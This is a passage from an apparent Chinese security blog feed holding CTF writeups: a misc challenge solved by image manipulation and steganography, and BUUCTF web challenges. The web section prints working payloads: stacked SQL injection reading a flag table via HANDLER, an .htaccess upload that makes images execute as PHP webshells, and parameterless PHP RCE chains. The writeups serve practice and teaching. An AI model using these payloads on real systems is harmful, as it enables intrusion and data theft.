单文件网页文件格式识别</p><p>审计代码得知需要进行图像操作使上传一个不能是马的图，但是需要识别成马，所以我们使用脚本对其进行修改，对鹿图进行弱化处理，再附加上马图，但是两图的距离（详情请看knn的图像识别原理）马图需要比鹿图增加得慢，这样才可以识别成鹿图。</p><p><a href="https://blog.csdn.net/chaipp0607/article/details/77915298" target="_blank" rel="noopener">knn原理</a><a href="https://blog.csdn.net/qq_35206320/article/details/81946246" target="_blank" rel="noopener">带例子分析</a>反正我是没看懂</p><p>大概就是要传一个72*72的图，欧氏距离和horse更近一点</p><p>解密exp如下,源自官方</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">h = Image.open(<span class="string">'horse.png'</span>)</span><br><span class="line">d = Image.open(<span class="string">'deer.png'</span>)</span><br><span class="line">a,b = h.size</span><br><span class="line">h_pixels = []</span><br><span class="line">d_pixels = []</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(b):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(a):</span><br><span class="line">        h_pixels.append(h.getpixel((x,y))//<span class="number">50</span>)</span><br><span class="line">        d_pixels.append(d.getpixel((x,y)))  </span><br><span class="line">plt.imshow(np.array(h_pixels).reshape(<span class="number">72</span>,<span class="number">72</span>))</span><br><span class="line">plt.show()</span><br><span class="line">plt.imshow(np.array(d_pixels).reshape(<span class="number">72</span>,<span class="number">72</span>))</span><br><span class="line">plt.show()</span><br><span class="line">res1_png = Image.new(<span class="string">'L'</span>,(a,b))</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(b):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(a):</span><br><span class="line">        <span class="keyword">if</span> d_pixels[x+a*y] != <span class="number">0</span>:</span><br><span class="line">            res1_png.putpixel((x,y),d_pixels[x+a*y]<span class="number">-100</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res1_png.putpixel((x,y),<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(b):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(a):</span><br><span class="line">        res1_png.putpixel((x,y),res1_png.getpixel((x,y))+h_pixels[x+a*y]*<span class="number">33</span>)</span><br><span class="line">res1_png.save(<span class="string">'deer1.png'</span>)</span><br><span class="line">plt.imshow(res1_png)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>从deer开始随手改了几个像素点为horse同位置的数值，然后保存为deer1.png,base64提交一下<br><figure class="image-box">                <img src="./8.png" alt="图片" title class>                <p>图片</p>            </figure></p><p>收到一大串base64，扔进<a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener">cyberchef</a>解一下里面又有个base64，转图片得到flag。</p><h2 id="Barbar"><a href="#Barbar" class="headerlink" title="Barbar"></a>Barbar</h2><p>首先发现电脑端CQR和手机端扫描结果不一样,怀疑有隐藏信息</p><figure class="image-box">                <img src="./9.png" alt="图片" title class>                <p>图片</p>            </figure><p>foremost分离文件</p><figure class="image-box">                <img src="./10.png" alt="图片" title class>                <p>图片</p>            </figure><p><a href="https://yuanfux.github.io/zero-width-web/" target="_blank" rel="noopener">在线网站</a>零宽字节隐写,扫描出隐藏密码</p><figure class="image-box">                <img src="./11.png" alt="图片" title class>                <p>图片</p>            </figure><p>用该密码YcfVgMBUraXftwO6Cp92YBGAbyRyWNOO解压缩包得到</p><figure class="image-box">                <img src="./12.png" alt="图片" title class>                <p>图片</p>            </figure><p>docx里暂无别的信息,选择先修二维码</p><figure class="image-box">                <img src="./13.png" alt="图片" title class>                <p>图片</p>            </figure><p>队友修完后扫描结果为</p><figure class="image-box">                <img src="./14.png" alt="图片" title class>                <p>图片</p>            </figure><p>修了个寂寞,于是倒回去继续看docx解码,在document.xml里发现base64图片</p><figure class="image-box">                <img src="./15.png" alt="图片" title class>                <p>图片</p>            </figure><p>是个Aztec code,中国编码app扫出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">di`f&#123;e1c64e14db14c6bb8faabab5bd7be1dc&#125;</span><br></pre></td></tr></table></figure></p><p>再进行npiet解密<br><a href="http://www.bertnase.de/npiet/npiet-execute.php" target="_blank" rel="noopener">在线网站</a><br><figure class="image-box">                <img src="./16.png" alt="图片" title class>                <p>图片</p>            </figure></p><p>flag{f2d76g36fd16cbb6abaaf8db57cbd1ed}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;做的时候就觉得题目阴间得一匹,没想到官方wp也这么阴间,原理呢?分析呢?不管怎么说看着就是不明不白脑洞也贼多,复现起来也怪怪的&lt;/p&gt;
&lt;h
      
    
    </summary>
    
    
      <category term="ctf writeup misc" scheme="https://www.damyahome.github.io/categories/ctf-writeup-misc/"/>
    
    
      <category term="个人ctf竞赛" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>10.8 队内AWD小结</title>
    <link href="https://www.damyahome.github.io/AWD/ckwd9139k0000pwucjz8d1gos/10-8-%E9%98%9F%E5%86%85AWD%E5%B0%8F%E7%BB%93/"/>
    <id>https://www.damyahome.github.io/AWD/ckwd9139k0000pwucjz8d1gos/10-8-%E9%98%9F%E5%86%85AWD%E5%B0%8F%E7%BB%93/</id>
    <published>2020-10-11T11:00:52.000Z</published>
    <updated>2020-10-11T11:06:07.462Z</updated>
    
    <content type="html"><![CDATA[<p>不安全的内容就算导出md也是不安全,火绒真严格,pdf真香</p><p>pdf插件加载比较慢,请稍等一下下哈<br><div class="row">    <embed src="10_8_队内AWD小结.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;不安全的内容就算导出md也是不安全,火绒真严格,pdf真香&lt;/p&gt;
&lt;p&gt;pdf插件加载比较慢,请稍等一下下哈&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;10_8_队内AWD小结.pdf&quot; width=&quot;100%&quot; height=&quot;55
      
    
    </summary>
    
    
      <category term="AWD" scheme="https://www.damyahome.github.io/categories/AWD/"/>
    
    
      <category term="靶场练习" scheme="https://www.damyahome.github.io/tags/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF web练习5</title>
    <link href="https://www.damyahome.github.io/ctf-writeup-web/ckwd913bf001upwuct65h139y/BUUCTF-web%E7%BB%83%E4%B9%A05/"/>
    <id>https://www.damyahome.github.io/ctf-writeup-web/ckwd913bf001upwuct65h139y/BUUCTF-web%E7%BB%83%E4%B9%A05/</id>
    <published>2020-10-07T13:12:09.000Z</published>
    <updated>2020-10-07T13:20:27.489Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p><a href="http://202bc5e9-02e8-4c36-9793-151b247a806c.node3.buuoj.cn" target="_blank" rel="noopener">http://202bc5e9-02e8-4c36-9793-151b247a806c.node3.buuoj.cn</a></p><p>经测试是字符型注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&apos; or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./1.png" alt="图片" title class>                <p>图片</p>            </figure><p>尝试联合查询,爆出了黑名单,先用show查着</p><figure class="image-box">                <img src="./2.png" alt="图片" title class>                <p>图片</p>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure><p>根据匹配,先闭合语句再进行查询<br><figure class="image-box">                <img src="./3.png" alt="图片" title class>                <p>图片</p>            </figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&apos;;show databases;#</span><br><span class="line">?inject=1&apos;;show tables;#</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./4.png" alt="图片" title class>                <p>图片</p>            </figure><p>看到明显的FlagHere表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&apos;;show tables;show columns from FlagHere;show columns from words;#</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./5.png" alt="图片" title class>                <p>图片</p>            </figure><p>在mysql里还能使用handler进行查询,具体使用<a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html" target="_blank" rel="noopener">官方文档</a></p><p>handler…open语句将打开一个表,使其可以使用后续handler…read语句进行访问,该表对象未被其他会话共享,并且在会话调用handler…close或会话终止之前不会关闭</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&apos;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./6.png" alt="图片" title class>                <p>图片</p>            </figure><p>flag{901a13f0-67cb-4dd5-b765-0d2c02c91e81}</p><h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p><a href="http://5f42ce42-df7b-494b-bf63-bab03cd0f852.node3.buuoj.cn" target="_blank" rel="noopener">http://5f42ce42-df7b-494b-bf63-bab03cd0f852.node3.buuoj.cn</a></p><figure class="image-box">                <img src="./7.png" alt="图片" title class>                <p>图片</p>            </figure><p>过滤得很严,只能上传图片,但.htaccess也可以上传</p><p>传入.htaccess文件作为php解析器,使我们传入的图片马里包含的php语句生效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;.htaccess&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./8.png" alt="图片" title class>                <p>图片</p>            </figure><figure class="image-box">                <img src="./9.png" alt="图片" title class>                <p>图片</p>            </figure><p>在用蚁剑连接时连接图片地址</p><figure class="image-box">                <img src="./10.png" alt="图片" title class>                <p>图片</p>            </figure><p>进到根目录获得flag</p><figure class="image-box">                <img src="./11.png" alt="图片" title class>                <p>图片</p>            </figure><p>flag{29c63dce-7ee9-4f02-a809-c41bf114cd19}</p><h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p><a href="http://b8053621-499f-4613-8852-d66828da67fe.node3.buuoj.cn" target="_blank" rel="noopener">http://b8053621-499f-4613-8852-d66828da67fe.node3.buuoj.cn</a></p><p>先dirmap扫个目录</p><figure class="image-box">                <img src="./12.png" alt="图片" title class>                <p>图片</p>            </figure><p>看到有.git隐藏文件,用githack恢复</p><figure class="image-box">                <img src="./13.png" alt="图片" title class>                <p>图片</p>            </figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line"><span class="comment">//过滤伪协议</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line"><span class="comment">//正则匹配,传参会被替换成NULL且语句的合法形式是a(b());</span></span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line"><span class="comment">//过滤了一些关键字</span></span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="方法一-利用常量函数"><a href="#方法一-利用常量函数" class="headerlink" title="方法一:利用常量函数"></a>方法一:利用常量函数</h3><p>无参RCE需要一些php自带常量的函数来构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(scandir()) //首先想到的是输出目录,如何指定当前目录?</span><br><span class="line">?exp=print_r(scandir(current(localeconv()))) //current(localeconv())结合,输出本地数组的值</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./14.png" alt="图片" title class>                <p>图片</p>            </figure><p>php里有个next()函数可以用来读取数组的下一位元素,但在这题中不能连续使用,因为不适用a(b())格式,可flag.php正巧在倒数第二位,所以可以先用array_reverse()将数组倒序再进行读取,根据代码注释采用highlight_file()进行输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./15.png" alt="图片" title class>                <p>图片</p>            </figure><p>flag{16bab8e9-4333-4ff6-9ca3-ef4b717467ad}</p><h3 id="方法二-利用session"><a href="#方法二-利用session" class="headerlink" title="方法二:利用session"></a>方法二:利用session</h3><p>这是看大佬博客发现的方法,payload如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure><p>首先需要理解session的工作原理</p><ol><li>首先使用session_start()函数进行初始化</li><li>当执行PHP脚本时，通过使用$_SESSION超全局变量注册session变量</li><li>当PHP脚本执行结束时，未被销毁的session变量会被自动保存在本地一定路径下的session库中，这个路径可以通过php.ini文件中的session.save_path指定，下次浏览网页时可以加载使用</li></ol><p>而session_start()初始化的东西可以在cookie里使用默认值PHPSESSID或者php.ini中设定的session.name进行文件读取，如果读取到了这个cookie将会创建$_SESSION变量并从相应目录中读取文件，并将字符装入变量中；如果没读取到也会创建$_SESSION变量和session文件并返回值。</p><p>获取到session_start()的初始值后，session_id()可以用来获取session会话的id，在cookie里指定到flag.php后进行读取，再用show_source()进行输出。</p><figure class="image-box">                <img src="./16.png" alt="图片" title class>                <p>图片</p>            </figure><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p><a href="http://a8085622-bd11-414f-9ac0-6bebed5d4231.node3.buuoj.cn" target="_blank" rel="noopener">http://a8085622-bd11-414f-9ac0-6bebed5d4231.node3.buuoj.cn</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">I put something in F12 <span class="keyword">for</span> you</span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$flag=<span class="string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'gg'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>])) &#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$gg=$_GET[<span class="string">'gg'</span>];</span><br><span class="line"><span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'You got the first step'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">$passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Good Job!'</span>;</span><br><span class="line">highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'By Retr_0'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"can you think twice??"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'You can not get it !'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'only one way to get the flag'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"You are not a real hacker!"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Please input first'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure><p>主要进行了GET方面$gg和$id的md5判断,和POST方面的$passwd密码传参<br>直接数组绕过md5判断,数字加字母绕过密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?gg[]=a&amp;id[]=b</span><br><span class="line">passwd=1234567a</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./17.png" alt="图片" title class>                <p>图片</p>            </figure><p>flag{9cada024-2b17-4a01-ad45-23871db3d3c9}</p><h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p><a href="http://e695ad48-e686-4361-a809-93147a6a1133.node3.buuoj.cn" target="_blank" rel="noopener">http://e695ad48-e686-4361-a809-93147a6a1133.node3.buuoj.cn</a></p><p>将代码进行排版,是个flask的框架</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          </span><br><span class="line">        <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(resp)</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span 